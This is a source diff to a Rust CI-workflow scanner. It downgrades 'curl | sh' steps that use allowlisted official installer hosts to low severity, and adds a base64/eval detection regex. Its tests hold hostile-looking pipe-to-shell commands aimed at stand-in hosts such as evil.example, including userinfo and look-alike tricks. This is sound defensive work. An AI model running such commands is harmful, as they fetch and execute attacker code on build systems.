@@ -25,6 +25,60 @@ fn is_workflow(p: &str) -> bool {
         && (p.ends_with(".yml") || p.ends_with(".yaml"))
 }
 
+#[derive(serde::Deserialize)]
+struct Installers {
+    installer: Vec<Installer>,
+}
+
+#[derive(serde::Deserialize)]
+struct Installer {
+    host: String,
+    path: String,
+    /// Where the installer is documented (checked by a test).
+    #[cfg_attr(not(test), allow(dead_code))]
+    source: String,
+}
+
+static INSTALLERS: std::sync::LazyLock<Installers> = std::sync::LazyLock::new(|| {
+    toml::from_str(include_str!("../data/installers.toml")).expect("data/installers.toml is valid")
+});
+
+static URL: std::sync::LazyLock<regex::Regex> =
+    std::sync::LazyLock::new(|| regex::Regex::new(r#"(?i)\b[a-z][a-z0-9+.-]*://[^\s'"`|;&)<>]+"#).unwrap());
+
+/// Decoding or eval: never an "official installer", whatever the URL.
+static DECODE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
+    regex::Regex::new(r"(?i)\bbase64\s+(-d|--decode)|frombase64string|atob\(|-enc(odedcommand)?\s|\beval\s*\(").unwrap()
+});
+
+/// The installer host when a step only pipes official installers into a
+/// shell: every URL in it is https and on the list, and nothing is decoded.
+fn official_installer(run: &str) -> Option<String> {
+    if DECODE.is_match(run) || run.to_ascii_lowercase().contains("secrets.") {
+        return None;
+    }
+    let mut hosts = Vec::new();
+    for m in URL.find_iter(run) {
+        let rest = m.as_str().strip_prefix("https://")?;
+        let (authority, path) = match rest.find('/') {
+            Some(i) => (&rest[..i], &rest[i..]),
+            None => (rest, "/"),
+        };
+        // No userinfo, no port: `https://sh.rustup.rs@evil.example/` is evil.example.
+        if authority.contains('@') || authority.contains(':') {
+            return None;
+        }
+        let host = authority.to_ascii_lowercase();
+        let known = INSTALLERS.installer.iter().any(|i| i.host == host && path.starts_with(&i.path));
+        if !known {
+            return None;
+        }
+        hosts.push(host);
+    }
+    hosts.dedup();
+    (!hosts.is_empty()).then(|| hosts.join(", "))
+}
+
 pub struct Ci;
 
 impl Detector for Ci {
@@ -225,11 +279,15 @@ fn signals(text: &str) -> Vec<Signal> {
                 });
             }
             if let Some(b) = danger(&run) {
+                let (severity, title) = match official_installer(&run) {
+                    Some(host) => (Severity::Low, format!("Job `{jid}` step {i} runs an official installer ({host})")),
+                    None => (Severity::Medium, format!("Job `{jid}` step {i} fetches or decodes code to run")),
+                };
                 out.push(Signal {
                     rule: "t9.workflow.remote-exec",
-                    severity: Severity::Medium,
+                    severity,
                     key: format!("{jid}:{i}:{}", clip(&run, 80)),
-                    title: format!("Job `{jid}` step {i} fetches or decodes code to run"),
+                    title,
                     detail: format!("{b}: {}", clip(&run, 200)),
                 });
             }
@@ -273,6 +331,39 @@ mod tests {
 
     fn rules(f: &[Finding]) -> Vec<(&str, Severity)> {
         f.iter().map(|x| (x.rule, x.severity)).collect()
+    }
+
+    fn step(run: &str) -> Vec<(&'static str, Severity)> {
+        let wf = format!("on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: {run}\n");
+        scan(&Ci, &added(".github/workflows/b.yml", wf.as_bytes()))
+            .into_iter()
+            .filter(|f| f.rule == "t9.workflow.remote-exec")
+            .map(|f| (f.rule, f.severity))
+            .collect()
+    }
+
+    #[test]
+    fn official_installers_are_low() {
+        let low = [("t9.workflow.remote-exec", Severity::Low)];
+        let med = [("t9.workflow.remote-exec", Severity::Medium)];
+        assert_eq!(step("curl --proto '=https' -sSf https://sh.rustup.rs | sh -s -- -y"), low);
+        assert_eq!(step("curl -LsSf https://astral.sh/uv/install.sh | sh"), low);
+        assert_eq!(step("curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash"), low);
+        // Plain http, look-alike hosts, userinfo tricks, other repos, extra URLs, decoding.
+        assert_eq!(step("curl http://sh.rustup.rs | sh"), med);
+        assert_eq!(step("curl https://sh.rustup.rs.evil.example | sh"), med);
+        assert_eq!(step("curl https://sh.rustup.rs@evil.example/x | sh"), med);
+        assert_eq!(step("curl https://raw.githubusercontent.com/evil/nvm/install.sh | bash"), med);
+        assert_eq!(step("curl https://sh.rustup.rs | sh && curl https://x.example/a | sh"), med);
+        assert_eq!(step("curl https://sh.rustup.rs | sh; echo aGk= | base64 -d | sh"), med);
+    }
+
+    #[test]
+    fn installer_entries_have_sources() {
+        for i in &INSTALLERS.installer {
+            assert!(i.source.starts_with("https://"), "{}", i.host);
+            assert!(i.path.starts_with('/'), "{}", i.host);
+        }
     }
 
     #[test]
